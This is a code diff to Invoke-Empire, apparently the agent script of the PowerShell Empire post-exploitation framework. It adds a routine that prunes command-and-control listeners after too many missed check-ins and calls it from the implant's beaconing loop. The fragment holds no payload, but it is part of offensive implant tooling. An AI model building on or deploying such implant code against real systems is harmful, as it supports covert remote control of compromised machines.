@@ -807,6 +807,16 @@ function Invoke-Empire {
 		}
 	}
 
+	$script:CleanUpListeners = {
+		$newlisteners = @()
+		foreach ($l in $script:listeners){
+			if ($l["missedCheckins"] < $l["lostLimit"]){
+				$newlisteners += $l
+			}
+		}
+		$script:listeners = $newlisteners
+	}
+
 	$script:BeaconBack = {
 		param($JobResults)
 		foreach ($l in $script:listeners){
@@ -816,6 +826,7 @@ function Invoke-Empire {
 			}
 			((& $script:GetTask))
 		}
+		((& $script:CleanUpListeners))
 	}
 	# send message function iterating through listeners
 	$script:SendMessage = {
